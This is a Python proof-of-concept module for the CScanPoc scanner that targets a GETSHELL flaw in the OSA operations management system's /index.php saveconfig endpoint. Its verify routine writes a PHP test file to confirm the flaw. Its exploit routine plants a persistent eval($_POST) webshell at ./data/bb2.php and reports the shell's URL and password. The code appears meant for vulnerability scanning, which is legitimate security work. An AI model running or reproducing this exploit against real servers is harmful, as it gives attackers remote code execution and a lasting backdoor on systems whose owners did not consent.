# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'OSA_0001_p'  # 平台漏洞编号，留空
    name = 'OSA运维管理系统前台 /index.php GETSHELL'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '*********'  # 漏洞公布时间
    desc = '''
        OSA运维管理系统前台 /index.php GETSHELL漏洞,直接危机服务器安全.
    '''  # 漏洞描述
    ref = 'https://www.t00ls.net/thread-28079-1-1.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'OSA'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ea930a1e-ee72-4508-bd31-b394d6653ff9'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(
                target=self.target)+'/index.php?c=maintain&a=saveconfig&id=1'
            post_one_content = 'ctext[1]=<?php echo md5(321123);?>&cfilename=./data/tmp.php&buddysubmit=buddysubmit'
            req = urllib.request.Request(verify_url, post_one_content)
            response = urllib.request.urlopen(req)
            # To determine whether there
            shell_url = '{target}'.format(target=self.target)+'./data/tmp.php'
            shell_content = urllib.request.urlopen(shell_url).read()
            if '150920ccedc34d24031cdd3711e43310' in shell_content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            verify_url = '{target}'.format(
                target=self.target) + '/index.php?c=maintain&a=saveconfig&id=1'
            post_one_content = ('ctext[1]=<?php echo md5(321123); eval($_POST["test"]); ?>&'
                                'cfilename=./data/bb2.php&buddysubmit=buddysubmit')
            req = urllib.request.Request(verify_url, post_one_content)
            response = urllib.request.urlopen(req)
            # To determine whether there
            shell_url = '{target}'.format(target=self.target)+'./data/bb2.php'
            shell_content = urllib.request.urlopen(shell_url).read()
            if '150920ccedc34d24031cdd3711e43310' in shell_content:
                password = 'test'
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的Webshell地址为{url}密码为{password}'.format(
                    target=self.target, name=self.vuln.name, url=shell_url, password=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
